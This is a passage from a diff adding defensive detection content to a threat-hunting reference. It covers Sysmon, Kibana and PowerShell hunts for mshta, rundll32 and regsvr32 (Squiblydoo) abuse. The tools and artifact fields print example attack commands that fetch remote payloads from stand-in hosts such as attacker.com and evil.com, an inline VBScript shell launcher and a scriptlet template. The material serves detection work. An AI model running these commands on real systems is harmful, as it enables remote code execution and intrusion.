@@ -2346,16 +2346,218 @@ Sysinternals autoruns.exe:
     desc: "mshta.exe HTA execution, URL invocation, inline VBS/JS payloads",
     rows: [
       {
-        sub: "T1218.005 - Coming Soon",
-        indicator: "Full content for T1218.005 Mshta coming in next build session",
-        sysmon: "(see widget summary in build session for headline indicator)",
-        kibana: "(coming soon)",
-        powershell: "(coming soon)",
-        registry: "(coming soon)",
-        tools: "(coming soon)",
-        ossdetect: "(coming soon)",
-        notes: "Planned coverage: mshta with HTTP URL, mshta with inline vbscript:/javascript: payload. 2 indicators planned. mshta.exe is a signed Microsoft binary - bypasses many script-based defenses.",
-        apt: [{ cls: "apt-mul", name: "Coming soon", note: "Full APT attribution in next session" }],
+        sub: "T1218.005 - mshta.exe with Remote URL Argument",
+        indicator: "mshta.exe invoked with HTTP/HTTPS URL or UNC path - fetches and executes remote HTA payload",
+        sysmon: `EventID=1
+Image=*\\mshta.exe
+CommandLine matches:
+  *http://* OR *https://* OR *\\\\\\\\*
+
+// Also network connection from mshta to non-Microsoft:
+EventID=3
+Image=*\\mshta.exe
+DestinationPort=80 OR 443 OR 8080`,
+        kibana: `// Primary: mshta with URL or UNC in command line
+winlog.event_id: 1
+AND process.name: "mshta.exe"
+AND process.command_line: (*http\:\/\/* OR *https\:\/\/* OR *\\\\\\\\*)
+
+// Supplementary: mshta initiating outbound connection
+winlog.event_id: 3
+AND process.name: "mshta.exe"
+AND destination.port: (80 OR 443 OR 8080)`,
+        powershell: `# Hunt for mshta.exe with URL/UNC argument
+Get-WinEvent -FilterHashtable @{
+  LogName='Microsoft-Windows-Sysmon/Operational';
+  ID=1
+} | Where-Object {
+  $_.Properties[4].Value -like '*\\mshta.exe' -and
+  $_.Properties[10].Value -match '(http://|https://|\\\\\\\\)'
+} | Select TimeCreated,
+  @{n='CmdLine';e={$_.Properties[10].Value}},
+  @{n='Parent';e={($_.Properties[20].Value -split '\\\\')[-1]}},
+  @{n='User';e={$_.Properties[12].Value}} |
+  Sort-Object TimeCreated -Descending
+
+# Supplementary: outbound network from mshta
+Get-WinEvent -FilterHashtable @{
+  LogName='Microsoft-Windows-Sysmon/Operational';
+  ID=3
+} | Where-Object {
+  $_.Properties[4].Value -like '*\\mshta.exe'
+} | Select TimeCreated,
+  @{n='DestIP';e={$_.Properties[14].Value}},
+  @{n='DestHost';e={$_.Properties[15].Value}},
+  @{n='DestPort';e={$_.Properties[16].Value}}`,
+        registry: `mshta.exe location (legitimate):
+- C:\\Windows\\System32\\mshta.exe
+- C:\\Windows\\SysWOW64\\mshta.exe
+mshta.exe found anywhere else = high-confidence IOC
+
+HTA file artifacts (if HTA downloaded to disk first):
+- %TEMP%\\*.hta
+- %APPDATA%\\*.hta
+- IE/Edge download cache:
+  %LOCALAPPDATA%\\Microsoft\\Windows\\
+    INetCache\\IE\\<random>\\<file>.hta
+
+Zone.Identifier ADS on downloaded HTA:
+- Get-Item file.hta -Stream Zone.Identifier
+  ZoneId=3 = internet origin
+
+URL cache for mshta:
+- Same as IE cache (mshta uses WinINet for fetches)
+- %LOCALAPPDATA%\\Microsoft\\Windows\\
+    INetCache\\IE\\*
+
+Investigation pivots:
+- What process spawned mshta?
+  Parent process tells the delivery vector
+- What did mshta spawn afterward?
+  HTA payloads typically launch cmd, powershell,
+  or drop and execute a binary - chain into child
+  process analysis`,
+        tools: `Phishing operators (mshta as second stage)
+Cobalt Strike (HTA payload generation built-in)
+Metasploit (exploit/windows/misc/hta_shell)
+Empire (HTA-based stagers)
+DotNetToJScript (generates HTA-loadable payloads)
+Custom HTA droppers (still common in 2026)
+
+Common mshta abuse patterns:
+- mshta.exe http://attacker.com/payload.hta
+  (remote HTA fetch - one-line RCE)
+- mshta.exe \\\\attacker\\share\\payload.hta
+  (UNC path - same idea via SMB)
+- mshta.exe vbscript:CreateObject("Wscript.Shell")
+  .Run("cmd.exe /c whoami")(window.close)
+  (inline VBScript - no file needed)
+- mshta.exe javascript:alert(1) (inline JScript)
+
+LOLBAS catalog reference:
+- lolbas-project.github.io/lolbas/Binaries/Mshta/
+- Documents all known mshta abuse techniques`,
+        ossdetect: `Sigma:
+- proc_creation_win_mshta_url_argument.yml
+- proc_creation_win_mshta_inline_susp.yml
+- proc_creation_win_mshta_susp_parent.yml
+- network_connection_win_mshta.yml
+
+Atomic Red Team:
+- T1218.005 Test #1 (mshta executing HTA)
+- T1218.005 Test #2 (mshta inline JScript)
+
+Hayabusa:
+- MshtaUrlArgument rules
+- MshtaInlineScript detection category
+
+Velociraptor:
+- Windows.EventLogs.Sysmon
+- Windows.Forensics.SRUM (network connections per process)
+
+LOLBAS project:
+- lolbas-project.github.io/lolbas/Binaries/Mshta/
+- Comprehensive abuse documentation`,
+        notes: "mshta.exe is one of the cleanest one-line remote code execution primitives in Windows. The detection sweet spot is the argument: legitimate mshta usage almost never involves a URL or UNC path - HTAs in legitimate enterprise software are launched from local installed paths. A URL in the mshta command line is high-fidelity malicious in virtually all environments. The inline VBScript and JScript variants (`mshta.exe vbscript:...` and `mshta.exe javascript:...`) are even cleaner indicators because they require no remote fetch - the entire payload is on the command line. Worth pairing this indicator with parent process context: mshta spawned by an Office app, browser, or explorer.exe is a phishing chain; mshta spawned by a known IT management process is more likely legitimate. The network connection pivot (EID 3 from mshta) is useful for catching the fetch portion when the URL itself has been obfuscated in the command line.",
+        apt: [
+          { cls: "apt-ru", name: "APT28", note: "HTA-based delivery documented in spearphishing campaigns." },
+          { cls: "apt-cn", name: "APT41", note: "mshta-based loaders documented across operations targeting multiple sectors." },
+          { cls: "apt-kp", name: "Kimsuky", note: "HTA delivery extensively documented in operations against South Korean targets." },
+          { cls: "apt-mul", name: "Commodity Malware", note: "Trickbot, IcedID, and various phishing operators have used mshta-based delivery chains." },
+          { cls: "apt-mul", name: "Red Teams", note: "Cobalt Strike HTA payload generation is a standard red team capability." }
+        ],
+        cite: "MITRE ATT&CK T1218.005"
+      },
+      {
+        sub: "T1218.005 - mshta.exe with Inline Script Payload",
+        indicator: "mshta.exe with vbscript: or javascript: protocol handler in command line - fileless inline execution",
+        sysmon: `EventID=1
+Image=*\\mshta.exe
+CommandLine matches:
+  *vbscript:* OR *javascript:* OR *jscript:*
+
+// These protocol handlers tell mshta to execute the
+// rest of the command line as inline script - no
+// remote fetch, no file on disk required`,
+        kibana: `winlog.event_id: 1
+AND process.name: "mshta.exe"
+AND process.command_line: (*vbscript\:* OR *javascript\:* OR *jscript\:*)`,
+        powershell: `# Hunt for mshta with inline script protocol handlers
+Get-WinEvent -FilterHashtable @{
+  LogName='Microsoft-Windows-Sysmon/Operational';
+  ID=1
+} | Where-Object {
+  $_.Properties[4].Value -like '*\\mshta.exe' -and
+  $_.Properties[10].Value -match '(vbscript|javascript|jscript):'
+} | Select TimeCreated,
+  @{n='CmdLine';e={$_.Properties[10].Value}},
+  @{n='Parent';e={($_.Properties[20].Value -split '\\\\')[-1]}},
+  @{n='User';e={$_.Properties[12].Value}} |
+  Sort-Object TimeCreated -Descending`,
+        registry: `No file artifact - inline scripts execute from memory.
+
+The full payload is in the command line itself:
+- Sysmon EID 1 CommandLine field captures everything
+- Process command line is the primary forensic artifact
+- Decode any base64 or string concatenation in the payload
+  to understand intent
+
+Investigation pivots:
+- Child processes of mshta:
+  Sysmon EID 1, filter ParentProcessId = mshta PID
+- Network connections from mshta:
+  Sysmon EID 3 within same session
+- Subsequent file writes:
+  Sysmon EID 11 from mshta or its children
+
+Common adversary inline payload patterns:
+- CreateObject("Wscript.Shell").Run(...)
+  (spawning cmd or powershell)
+- CreateObject("MSXML2.XMLHTTP")
+  (HTTP request from mshta - second-stage download)
+- Eval(base64decoded string)
+  (obfuscated payload decoding inline)`,
+        tools: `Inline mshta payloads are typically:
+- One-line phishing payloads embedded in HTA files
+- Manually crafted operator commands
+- Part of multi-stage chains where stage 1 is a
+  short bootstrap and stage 2+ are downloaded
+
+Generators / frameworks:
+Cobalt Strike (HTA generation with inline option)
+Manual operators using Wscript.Shell COM object
+PowerShell Empire HTA stagers
+
+The inline form is most often seen in:
+- HTML email phishing where the HTA content is
+  embedded directly in a downloaded file
+- LOLBAS abuse demonstrations and training material
+- Memory-only post-exploitation (no file artifact)`,
+        ossdetect: `Sigma:
+- proc_creation_win_mshta_inline_susp.yml
+- proc_creation_win_mshta_vbscript.yml
+- proc_creation_win_mshta_javascript.yml
+
+Atomic Red Team:
+- T1218.005 Test #2 (mshta inline JScript)
+- T1218.005 Test #3 (mshta inline VBScript)
+
+Hayabusa:
+- MshtaInlineScript detection rules
+- High-fidelity (no legitimate use case)
+
+Velociraptor:
+- Windows.EventLogs.Sysmon
+
+LOLBAS project:
+- lolbas-project.github.io/lolbas/Binaries/Mshta/`,
+        notes: "The inline script variant (vbscript: / javascript: / jscript: protocol handlers) has near-zero legitimate use in modern enterprise environments. Unlike the URL variant where the false positive consideration is 'is this an internal HTA app being launched legitimately,' the inline form is almost exclusively an attacker convenience. The payload appears directly in the command line, which is both an opportunity and a challenge: opportunity because the full intent is visible in a single Sysmon event; challenge because the payload is often obfuscated with string concatenation, character codes, or chained CreateObject calls to defeat string matching. Detection should focus on the protocol handler keywords (vbscript:, javascript:, jscript:) rather than trying to pattern-match the payload itself. Once an alert fires, manual decoding of the command line reveals intent. Pair with child process analysis: inline mshta almost always spawns cmd.exe or powershell.exe as a follow-on stage.",
+        apt: [
+          { cls: "apt-cn", name: "APT41", note: "Inline mshta payloads documented in operations targeting tech and gaming sectors." },
+          { cls: "apt-kp", name: "Kimsuky", note: "Inline VBScript via mshta documented in operations against South Korean and US targets." },
+          { cls: "apt-mul", name: "Red Teams", note: "Inline mshta is a standard LOLBin abuse demonstration in red team toolkits." },
+          { cls: "apt-mul", name: "Phishing Operators", note: "Inline mshta payloads in HTA email attachments documented across commodity phishing campaigns." }
+        ],
         cite: "MITRE ATT&CK T1218.005"
       }
     ]
@@ -2366,17 +2568,346 @@ Sysinternals autoruns.exe:
     desc: "rundll32.exe DLL execution abuse, javascript: invocation, no-args anomaly",
     rows: [
       {
-        sub: "T1218.011 - Coming Soon",
-        indicator: "Full content for T1218.011 Rundll32 coming in next build session",
-        sysmon: "(see widget summary in build session for headline indicator)",
-        kibana: "(coming soon)",
-        powershell: "(coming soon)",
-        registry: "(coming soon)",
-        tools: "(coming soon)",
-        ossdetect: "(coming soon)",
-        notes: "Planned coverage: rundll32 with DLL path in non-system location, rundll32 with javascript: argument, rundll32 with no arguments (suspect injection). 3 indicators planned.",
-        apt: [{ cls: "apt-mul", name: "Coming soon", note: "Full APT attribution in next session" }],
+        sub: "T1218.011 - rundll32.exe Loading DLL from Suspicious Path",
+        indicator: "rundll32.exe with DLL argument pointing to user-writable path or non-standard location",
+        sysmon: `EventID=1
+Image=*\\rundll32.exe
+CommandLine matches:
+  *\\AppData\\* OR *\\Temp\\*
+  OR *\\ProgramData\\* OR *\\Users\\Public\\*
+  OR *\\Downloads\\*
+
+// Also watch for unsigned DLL load by rundll32:
+EventID=7 (Image Load)
+Image=*\\rundll32.exe
+Signed=false`,
+        kibana: `// Primary: rundll32 with suspicious DLL path
+winlog.event_id: 1
+AND process.name: "rundll32.exe"
+AND process.command_line: (*\\AppData\\* OR *\\Temp\\* OR *\\ProgramData\\* OR *\\Public\\* OR *\\Downloads\\*)
+
+// Supplementary: unsigned DLL loaded by rundll32 (EID 7)
+winlog.event_id: 7
+AND process.name: "rundll32.exe"
+AND file.code_signature.signed: false`,
+        powershell: `# Hunt for rundll32 loading DLLs from suspicious paths (EID 1)
+Get-WinEvent -FilterHashtable @{
+  LogName='Microsoft-Windows-Sysmon/Operational';
+  ID=1
+} | Where-Object {
+  $_.Properties[4].Value -like '*\\rundll32.exe' -and
+  $_.Properties[10].Value -match
+    '(AppData|Temp|ProgramData|Public|Downloads)'
+} | Select TimeCreated,
+  @{n='CmdLine';e={$_.Properties[10].Value}},
+  @{n='Parent';e={($_.Properties[20].Value -split '\\\\')[-1]}},
+  @{n='User';e={$_.Properties[12].Value}} |
+  Sort-Object TimeCreated -Descending
+
+# Supplementary: unsigned DLLs loaded by rundll32 (EID 7)
+Get-WinEvent -FilterHashtable @{
+  LogName='Microsoft-Windows-Sysmon/Operational';
+  ID=7
+} | Where-Object {
+  $_.Properties[4].Value -like '*\\rundll32.exe' -and
+  $_.Properties[13].Value -eq 'false'
+} | Select TimeCreated,
+  @{n='LoadedDLL';e={$_.Properties[5].Value}},
+  @{n='Signed';e={$_.Properties[13].Value}}`,
+        registry: `rundll32.exe location (legitimate):
+- C:\\Windows\\System32\\rundll32.exe
+- C:\\Windows\\SysWOW64\\rundll32.exe
+
+DLL on disk - primary forensic artifact:
+- Inspect the DLL specified in the rundll32 command line
+- Check signature: Get-AuthenticodeSignature <path>
+- Check entropy: high entropy = likely packed/encrypted
+- Check exports: dumpbin /exports or Get-PEHeader
+
+DLL search order context:
+- Rundll32 loads DLLs from the path given in the command line
+- If only a name is given (no path), Windows DLL search
+  order applies - this is the side-loading attack surface
+  (covered in T1129 Shared Modules)
+
+Common adversary DLL drop locations:
+- %APPDATA%\\<random>.dll
+- %TEMP%\\<random>.dll
+- C:\\ProgramData\\<random>.dll
+- %PUBLIC%\\<random>.dll
+- Filename obfuscation: .dat, .tmp, .log extensions
+  with actual DLL content inside
+
+Investigation pivots:
+- Sysmon EID 11 (FileCreate) for the DLL drop event
+- USN Journal for DLL creation time even after deletion
+- $MFT for deleted DLL metadata`,
+        tools: `Cobalt Strike (rundll32-based payloads built-in)
+Metasploit (windows/local/rundll32 modules)
+Empire (rundll32 stagers)
+Custom DLL loaders for second-stage delivery
+SmokeLoader, IcedID, QakBot (rundll32 in delivery chains)
+
+LOLBAS abuse patterns:
+- rundll32.exe shell32.dll,Control_RunDLL
+  <malicious_cpl_file>
+  (Control Panel applet abuse - .cpl is a DLL)
+- rundll32.exe url.dll,FileProtocolHandler
+  <malicious_URL>
+  (URL handler abuse - launches default app for URL)
+- rundll32.exe javascript:"\..\mshtml,
+  RunHTMLApplication ";document.write();
+  GetObject("script:http://evil.com/x.sct")
+  (JavaScript invocation - covered in next indicator)
+
+LOLBAS reference:
+- lolbas-project.github.io/lolbas/Binaries/Rundll32/
+- ~15 documented rundll32 abuse techniques`,
+        ossdetect: `Sigma:
+- proc_creation_win_rundll32_susp_dll_path.yml
+- proc_creation_win_rundll32_dll_from_user_path.yml
+- image_load_win_rundll32_unsigned_dll.yml (EID 7)
+
+Atomic Red Team:
+- T1218.011 Test #1 (rundll32 loading DLL)
+- T1218.011 Test #4 (rundll32 with payload DLL)
+
+Hayabusa:
+- Rundll32SuspDllPath rules (EID 1)
+- Rundll32UnsignedDll detection (EID 7)
+
+Velociraptor:
+- Windows.EventLogs.Sysmon
+- Windows.System.DLL (loaded DLLs per process)
+
+LOLBAS project:
+- lolbas-project.github.io/lolbas/Binaries/Rundll32/`,
+        notes: "rundll32.exe is the most ubiquitous LOLBin in Windows - it's used constantly by legitimate Windows operations to invoke functions in system DLLs. The detection is path-focused: legitimate rundll32 calls load DLLs from System32, SysWOW64, or known vendor program directories. Rundll32 loading a DLL from AppData, Temp, ProgramData, or Public is high-confidence malicious in nearly all environments. The unsigned DLL angle via Sysmon EID 7 is a useful complement - it catches cases where the path is plausible but the DLL itself has no Microsoft or vendor signature. False positives: some legitimate vendor software does invoke rundll32 with DLLs from non-standard paths during installation, particularly older or poorly-designed installers. Build allowlists from baseline data. Pair with parent process context: rundll32 spawned by an Office app, browser, or explorer.exe with a DLL in AppData = phishing chain.",
+        apt: [
+          { cls: "apt-cn", name: "APT41", note: "Rundll32-based DLL loaders documented across multiple sector intrusions." },
+          { cls: "apt-ru", name: "APT28", note: "Rundll32 abuse documented in operations using custom DLL payloads." },
+          { cls: "apt-mul", name: "IcedID", note: "IcedID uses rundll32 to load its main DLL component as a standard delivery pattern." },
+          { cls: "apt-mul", name: "QakBot", note: "QakBot relies heavily on rundll32 for executing its main payload DLL." },
+          { cls: "apt-mul", name: "Ransomware", note: "Ransomware staging via rundll32-loaded DLLs documented across multiple families." }
+        ],
         cite: "MITRE ATT&CK T1218.011"
+      },
+      {
+        sub: "T1218.011 - rundll32.exe with JavaScript Protocol",
+        indicator: "rundll32.exe with javascript: in command line - abuses MSHTML library to execute inline JScript or fetch remote scriptlet",
+        sysmon: `EventID=1
+Image=*\\rundll32.exe
+CommandLine matches:
+  *javascript:* OR *jscript:*
+
+// This pattern abuses a quirk of rundll32 calling
+// mshtml.dll's RunHTMLApplication function with a
+// javascript: URI - similar conceptually to mshta
+// inline execution but via a different binary`,
+        kibana: `winlog.event_id: 1
+AND process.name: "rundll32.exe"
+AND process.command_line: (*javascript\:* OR *jscript\:*)`,
+        powershell: `# Hunt for rundll32 javascript: invocation
+Get-WinEvent -FilterHashtable @{
+  LogName='Microsoft-Windows-Sysmon/Operational';
+  ID=1
+} | Where-Object {
+  $_.Properties[4].Value -like '*\\rundll32.exe' -and
+  $_.Properties[10].Value -match '(javascript|jscript):'
+} | Select TimeCreated,
+  @{n='CmdLine';e={$_.Properties[10].Value}},
+  @{n='Parent';e={($_.Properties[20].Value -split '\\\\')[-1]}},
+  @{n='User';e={$_.Properties[12].Value}} |
+  Sort-Object TimeCreated -Descending`,
+        registry: `No persistent file artifact - inline JavaScript
+runs from memory inside rundll32 process context.
+
+The full payload is visible in Sysmon EID 1 CommandLine.
+
+Common pattern decode:
+rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";
+  document.write();GetObject("script:http://evil.com/x.sct")
+
+Breakdown:
+- mshtml = mshtml.dll (Microsoft's HTML rendering engine)
+- RunHTMLApplication = exported function from mshtml
+- javascript: protocol = the inline payload
+- GetObject("script:URL") = fetches and runs scriptlet
+
+Investigation pivots:
+- Outbound network connection from rundll32:
+  Sysmon EID 3 - typically fetches a .sct scriptlet
+- Child processes:
+  scriptlet often spawns cmd or powershell as next stage`,
+        tools: `Original research:
+- Casey Smith (subTee) documented rundll32 javascript:
+  invocation alongside other LOLBin discoveries
+
+Used by:
+Cobalt Strike (alternative stager option)
+Manual operators using LOLBin techniques
+Some commodity malware loaders
+DotNetToJScript-generated payloads
+
+Practical usage:
+- Bypasses some AppLocker / WDAC configurations
+  that allow rundll32 but block mshta or wscript
+- Bypasses string-based detections looking for
+  mshta-specific patterns
+- Less common than mshta inline scripts but
+  shares the same conceptual attack surface`,
+        ossdetect: `Sigma:
+- proc_creation_win_rundll32_javascript.yml
+- proc_creation_win_rundll32_inline_script.yml
+
+Atomic Red Team:
+- T1218.011 Test #2 (rundll32 javascript: variant)
+
+Hayabusa:
+- Rundll32JavascriptProtocol detection rules
+- High-fidelity (no legitimate use case)
+
+LOLBAS project:
+- lolbas-project.github.io/lolbas/Binaries/Rundll32/
+  (documents javascript: technique variant)
+
+Casey Smith research:
+- Original LOLBin abuse demonstrations
+- Foundation for understanding signed binary proxy
+  execution as a category`,
+        notes: "The javascript: protocol abuse via rundll32 is conceptually similar to mshta inline script execution - both rely on a Microsoft-signed binary loading the MSHTML or scripting engine and executing attacker-supplied code inline. Detection is straightforward because the pattern has no legitimate use: rundll32.exe with javascript: in the command line is high-confidence malicious. The technique is less common than mshta inline scripts in commodity malware but appears in environments where the operator suspects mshta is blocked or heavily monitored. Pair with outbound network detection: rundll32 making HTTP/HTTPS connections after a javascript: invocation typically means the inline code is fetching a second-stage scriptlet.",
+        apt: [
+          { cls: "apt-mul", name: "Casey Smith Research", note: "Originally documented as part of LOLBin abuse demonstrations." },
+          { cls: "apt-mul", name: "Red Teams", note: "Standard alternative to mshta inline scripts when mshta is blocked or monitored." },
+          { cls: "apt-cn", name: "APT41", note: "rundll32 javascript: variant documented in some intrusion reports." },
+          { cls: "apt-mul", name: "Commodity Malware", note: "Used by some loader families as a mshta alternative." }
+        ],
+        cite: "MITRE ATT&CK T1218.011"
+      },
+      {
+        sub: "T1218.011 - rundll32.exe with No Arguments",
+        indicator: "rundll32.exe process running with empty or near-empty command line - process hollowing or thread injection target",
+        sysmon: `EventID=1
+Image=*\\rundll32.exe
+CommandLine="rundll32.exe" OR CommandLine="C:\\Windows\\System32\\rundll32.exe"
+  (no arguments after the binary name)
+
+// Legitimate rundll32 is always fire-and-forget with
+// arguments. rundll32 running with no arguments is
+// almost always either:
+// 1. A process hollow target (adversary creates the
+//    process suspended, replaces memory, resumes it)
+// 2. A long-running injection host (adversary injects
+//    shellcode into it for stealth)`,
+        kibana: `// rundll32 with empty / no-argument command line
+winlog.event_id: 1
+AND process.name: "rundll32.exe"
+AND (
+  process.command_line: "rundll32.exe"
+  OR process.command_line: "C:\\\\Windows\\\\System32\\\\rundll32.exe"
+  OR process.command_line: "C:\\\\Windows\\\\SysWOW64\\\\rundll32.exe"
+  OR NOT process.command_line: *
+)`,
+        powershell: `# Hunt for rundll32 with no arguments
+Get-WinEvent -FilterHashtable @{
+  LogName='Microsoft-Windows-Sysmon/Operational';
+  ID=1
+} | Where-Object {
+  $_.Properties[4].Value -like '*\\rundll32.exe' -and (
+    -not $_.Properties[10].Value -or
+    $_.Properties[10].Value -match '^"?[A-Za-z:\\\\]*rundll32\.exe"?\s*$'
+  )
+} | Select TimeCreated,
+  @{n='CmdLine';e={$_.Properties[10].Value}},
+  @{n='Parent';e={($_.Properties[20].Value -split '\\\\')[-1]}},
+  @{n='User';e={$_.Properties[12].Value}} |
+  Sort-Object TimeCreated -Descending
+
+# Cross-reference with EID 8 - was a remote thread
+# injected into this rundll32 process?
+Get-WinEvent -FilterHashtable @{
+  LogName='Microsoft-Windows-Sysmon/Operational';
+  ID=8
+} | Where-Object {
+  $_.Properties[6].Value -like '*\\rundll32.exe'
+} | Select TimeCreated,
+  @{n='SourceImage';e={($_.Properties[4].Value -split '\\\\')[-1]}},
+  @{n='TargetImage';e={'rundll32.exe'}},
+  @{n='StartModule';e={$_.Properties[8].Value}}`,
+        registry: `No file artifact - this is a memory-based technique.
+
+Memory forensics for empty rundll32:
+- Volatility plugins:
+  - malfind: scans for injected code regions
+    (RWX memory in rundll32 with PE/shellcode)
+  - dlllist: legitimate rundll32 loads only the
+    DLL specified on command line plus dependencies
+    - empty rundll32 should have no extra DLLs
+  - hollowfind: detects process hollowing artifacts
+
+Live host triage:
+- Get-Process rundll32 | Select Id, StartTime,
+  MainModule, Modules
+- Check loaded modules against expected baseline
+  (legitimate empty rundll32 has very few modules)
+
+Sysmon cross-references:
+- EID 8 (CreateRemoteThread) targeting rundll32 PID
+- EID 10 (ProcessAccess) with write access mask to rundll32
+- These indicate injection occurred after the empty
+  rundll32 was created`,
+        tools: `Cobalt Strike default behavior:
+- Cobalt Strike's "spawnto" setting defaults to
+  rundll32.exe with no arguments for new process spawns
+- This makes empty rundll32 a high-fidelity Beacon IOC
+- Operators sometimes change spawnto for evasion
+
+Other frameworks using empty rundll32 as injection host:
+- Metasploit migrate command (rundll32 as target)
+- Custom shellcode loaders
+- Process hollowing implementations
+
+Why rundll32 specifically:
+- Signed Microsoft binary (trusted by default)
+- Expected to run on any Windows system
+- Has no expected long-running behavior (legitimate
+  usage is fire-and-forget) so memory persistence
+  is anomalous
+- Loads minimal default DLLs - easier to inject
+  into clean process state`,
+        ossdetect: `Sigma:
+- proc_creation_win_rundll32_no_arguments.yml
+- proc_creation_win_rundll32_susp_no_args.yml
+- sysmon_createremotethread_to_rundll32.yml
+
+Atomic Red Team:
+- T1218.011 (rundll32 variants)
+- T1055.012 (Process Hollowing - related)
+- T1055.001 (DLL Injection - related)
+
+Hayabusa:
+- Rundll32NoArgument detection rules
+- High-fidelity for Cobalt Strike Beacon detection
+
+Velociraptor:
+- Windows.EventLogs.Sysmon (EID 1 + EID 8 correlation)
+- Windows.Detection.Injection
+
+Get-InjectedThread (Jared Atkinson):
+- Scans live processes for threads with start
+  addresses in unattributed memory
+- Catches rundll32 injection cases that bypass
+  Sysmon EID 8 (some advanced injection methods
+  don't generate EID 8)`,
+        notes: "rundll32.exe with no command-line arguments is one of the highest-fidelity Cobalt Strike Beacon indicators in default configurations. Cobalt Strike's spawnto setting defaults to rundll32 with no arguments because rundll32 is signed, ubiquitous, and unexpected to run long-term - exactly what an adversary wants in an injection host. Legitimate rundll32 invocations always carry arguments (the DLL path and export function); empty rundll32 has effectively zero legitimate use cases. Sophisticated operators change Cobalt Strike's spawnto to a different binary (notepad.exe, conhost.exe, etc.) for evasion - the broader detection technique is signed Microsoft binaries running unexpectedly long with no arguments, but rundll32 specifically remains the most common default. Pair with Sysmon EID 8 (CreateRemoteThread targeting rundll32) and EID 10 (ProcessAccess with write masks to rundll32) for the full injection chain: empty rundll32 spawn followed by remote thread injection from the parent or another process = Cobalt Strike spawnto pattern.",
+        apt: [
+          { cls: "apt-mul", name: "Cobalt Strike", note: "Default spawnto behavior - empty rundll32 is the classic Cobalt Strike Beacon process indicator." },
+          { cls: "apt-ru", name: "APT29", note: "Cobalt Strike usage with default spawnto documented in SolarWinds and other operations." },
+          { cls: "apt-mul", name: "Ransomware", note: "Cobalt Strike Beacon use across ransomware operations means empty rundll32 is a common ransomware staging indicator." },
+          { cls: "apt-cn", name: "APT41", note: "Cobalt Strike and custom rundll32-based injection documented across operations." },
+          { cls: "apt-mul", name: "Red Teams", note: "Default Cobalt Strike configurations make this a near-universal red team operator IOC." }
+        ],
+        cite: "MITRE ATT&CK T1218.011, T1055"
       }
     ]
   },
@@ -2386,16 +2917,275 @@ Sysinternals autoruns.exe:
     desc: "regsvr32.exe Squiblydoo technique, scriptlet abuse, AppLocker bypass",
     rows: [
       {
-        sub: "T1218.010 - Coming Soon",
-        indicator: "Full content for T1218.010 Regsvr32 coming in next build session",
-        sysmon: "(see widget summary in build session for headline indicator)",
-        kibana: "(coming soon)",
-        powershell: "(coming soon)",
-        registry: "(coming soon)",
-        tools: "(coming soon)",
-        ossdetect: "(coming soon)",
-        notes: "Planned coverage: Squiblydoo classic (regsvr32 /i:URL fetching .sct), remote scriptlet variants. 2 indicators planned. Casey Smith's original research.",
-        apt: [{ cls: "apt-mul", name: "Coming soon", note: "Full APT attribution in next session" }],
+        sub: "T1218.010 - Squiblydoo (Remote Scriptlet Execution)",
+        indicator: "regsvr32.exe with /i: flag pointing to remote URL and scrobj.dll - classic Casey Smith Squiblydoo AppLocker bypass",
+        sysmon: `EventID=1
+Image=*\\regsvr32.exe
+CommandLine matches:
+  *scrobj.dll* AND (*http://* OR *https://* OR *\\\\\\\\*)
+
+// Also catch the simpler /i: with URL pattern:
+EventID=1
+Image=*\\regsvr32.exe
+CommandLine matches: */i:http://* OR */i:https://*
+
+// Network connection from regsvr32:
+EventID=3
+Image=*\\regsvr32.exe
+DestinationPort=80 OR 443 OR 8080`,
+        kibana: `// Primary: Squiblydoo pattern
+winlog.event_id: 1
+AND process.name: "regsvr32.exe"
+AND process.command_line: *scrobj.dll*
+AND process.command_line: (*http\:\/\/* OR *https\:\/\/* OR *\\\\\\\\*)
+
+// Broader /i: URL pattern (Squiblytwo variants)
+winlog.event_id: 1
+AND process.name: "regsvr32.exe"
+AND process.command_line: (*\/i\:http* OR *\/i\:https*)
+
+// Supplementary: regsvr32 making HTTP connections
+winlog.event_id: 3
+AND process.name: "regsvr32.exe"
+AND destination.port: (80 OR 443 OR 8080)`,
+        powershell: `# Hunt for Squiblydoo and variants
+Get-WinEvent -FilterHashtable @{
+  LogName='Microsoft-Windows-Sysmon/Operational';
+  ID=1
+} | Where-Object {
+  $_.Properties[4].Value -like '*\\regsvr32.exe' -and (
+    # Classic Squiblydoo with scrobj.dll + URL
+    ($_.Properties[10].Value -match 'scrobj\.dll' -and
+     $_.Properties[10].Value -match '(http://|https://|\\\\\\\\)') -or
+    # Simpler /i: URL variant
+    $_.Properties[10].Value -match '/i:(http|https)://'
+  )
+} | Select TimeCreated,
+  @{n='CmdLine';e={$_.Properties[10].Value}},
+  @{n='Parent';e={($_.Properties[20].Value -split '\\\\')[-1]}},
+  @{n='User';e={$_.Properties[12].Value}} |
+  Sort-Object TimeCreated -Descending
+
+# Supplementary: regsvr32 outbound network
+Get-WinEvent -FilterHashtable @{
+  LogName='Microsoft-Windows-Sysmon/Operational';
+  ID=3
+} | Where-Object {
+  $_.Properties[4].Value -like '*\\regsvr32.exe'
+} | Select TimeCreated,
+  @{n='DestIP';e={$_.Properties[14].Value}},
+  @{n='DestHost';e={$_.Properties[15].Value}},
+  @{n='DestPort';e={$_.Properties[16].Value}}`,
+        registry: `regsvr32.exe location (legitimate):
+- C:\\Windows\\System32\\regsvr32.exe
+- C:\\Windows\\SysWOW64\\regsvr32.exe
+
+scrobj.dll location (legitimate):
+- C:\\Windows\\System32\\scrobj.dll
+  (Microsoft Script Component Runtime - signed)
+
+Scriptlet (.sct) content - if downloaded to cache:
+- IE/WinINet cache:
+  %LOCALAPPDATA%\\Microsoft\\Windows\\
+    INetCache\\IE\\<random>\\*.sct
+- Scriptlets are XML files containing inline
+  VBScript or JScript - inspect with text editor
+
+The .sct file format:
+<?XML version="1.0"?>
+<scriptlet>
+  <registration ...>
+    <script language="JScript">
+      <![CDATA[
+        // attacker code here
+      ]]>
+    </script>
+  </registration>
+</scriptlet>
+
+Investigation pivots:
+- Sysmon EID 3 (network) reveals scriptlet URL
+- Child processes of regsvr32 reveal what the
+  scriptlet ultimately spawned
+- Decode any base64 or obfuscated content in
+  the scriptlet for true intent`,
+        tools: `Casey Smith (subTee) original research (2016):
+- "Bypassing AppLocker / Application Whitelisting
+  with regsvr32" - the original Squiblydoo writeup
+- Demonstrated that regsvr32 + scrobj.dll + URL
+  bypasses most AppLocker default configurations
+
+The name "Squiblydoo" comes from the technique pair:
+- Squiblydoo = regsvr32 abuse (this technique)
+- Squiblytwo = wmic /format: abuse (a related variant)
+
+Used by:
